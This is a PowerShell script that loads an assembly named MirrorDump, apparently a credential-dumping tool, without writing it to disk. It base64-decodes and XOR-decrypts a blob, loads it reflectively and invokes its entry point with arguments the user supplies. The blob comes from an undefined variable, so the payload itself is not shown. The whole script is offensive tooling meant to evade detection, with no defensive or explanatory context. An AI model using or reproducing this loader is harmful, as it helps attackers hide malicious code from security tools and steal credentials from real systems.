function Load-XLdr_MirrorDump { param([Parameter ()] $xk = "0xc1")
$loadedAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Fullname -eq "MirrorDump, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" }
if ($loadedAssembly) {
  return $loadedAssembly[0]  
}
$xk -eq "" -and ($xk = Read-Host "Specify XorKey")
$fb = [Convert]::FromBase64String($600b9b81)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor $xk}
$asm_XLdr_MirrorDump = [System.Reflection.Assembly]::Load($fb)
return $asm_XLdr_MirrorDump
}
function Invoke-XLdr_MirrorDump { param([Parameter ()] $Params = "")
$asm = Load-XLdr_MirrorDump
$Params -eq "" -and ($Params = Read-Host "Specify command arguments")
$asm.EntryPoint.Invoke($null, (, $Params.split()))
}